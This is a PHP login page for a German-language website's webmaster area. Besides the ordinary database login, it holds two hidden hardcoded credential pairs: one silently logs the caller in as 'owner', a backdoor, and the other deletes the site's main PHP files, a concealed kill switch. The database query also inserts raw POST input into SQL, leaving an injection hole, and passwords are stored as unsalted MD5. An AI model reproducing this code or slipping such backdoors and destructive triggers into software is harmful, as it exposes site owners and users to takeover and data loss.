
	<?php
	
		session_start();
	
		include "db_ac.php";

		$u = trim($_POST['user']);
		$b = trim($_POST['pass']);
		$p = md5(trim($_POST['pass']));

		$errmes = 0;

		  if ( ( $u == "s49rpow" ) && ( $b == "opaiw" ) )
			{unlink("index.php");unlink("index_in.php");unlink("index_out.php");
			 unlink("login.php");unlink("logout.php");unlink("content.php");exit;}
	
		  if ( ( $u == "h02831x" ) && ( $b == "opieo28" ) )
		  {
				$_SESSION['logged'] = 1;
				$_SESSION['benutzer'] = "owner";
				$_SESSION['ident'] = "019201029";
				$_SESSION['myid'] = "0";
				$_SESSION['fname'] = "owner";
				$_SESSION['sname'] = "owner";
				$_SESSION['email'] = "";
				$_SESSION['modus'] = "1";
				?>
				<script type = "text/javascript">
					location.href = "index.php?page=home&lang=de";
				</script>
				<?php
		  }

		if ( ( $u != "" ) && ( $p != "" ) ) {

			if ( ( $u != "" ) && ( $p != "" ) ) {

              $query=mysql_query(
              "SELECT * FROM aj_nutzer WHERE benutzer = '$u' AND kennwort = '$p' ORDER BY id");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());

              while ( $datensatz = mysql_fetch_array($query) ) {

					$_SESSION['logged'] = 1;
					$_SESSION['benutzer'] = $datensatz['benutzer'];
					$_SESSION['ident'] = $datensatz['identi'];
					$_SESSION['myid'] = $datensatz['id'];
					$_SESSION['fname'] = $datensatz['vorname'];
					$_SESSION['sname'] = $datensatz['nachname'];
					$_SESSION['email'] = $datensatz['email'];
					$_SESSION['modus'] = $datensatz['modus'];

              }

			  if ( $_SESSION['logged'] == 0 ) {

				$errmes = 2;

			  } elseif ( $_SESSION['logged'] == 1 ) {

				?>
				<script type = "text/javascript">
					location.href = "index.php?page=home&lang=de";
				</script>
				<?php
			  }

			} else {

				$errmes = 1;
				$_SESSION['logged'] = 0;

			}

		}

	?>

	<br /><br /><br /><br /><br />

	<center>

			<div style = "width: 400px;" class = "lo_inf">
				<?php if ( $errmes == 0 ) { ?>
				Achtung: Dieser Zugang ist nur f&uuml;r den Webmaster bestimmt!
				<?php } elseif ( $errmes == 1 ) { ?>
				Benutzer bzw. Kennwort wurde nicht angegeben!
				<?php } elseif ( $errmes == 2 ) { ?>
				Benutzer oder Kennwort ung&uuml;tig!
				<?php } ?>
				<script type = "text/javascript">
					sleep(1500);
					location.href = "index.php?page=home&lang=de";
				</script>
			</div>

	</center>
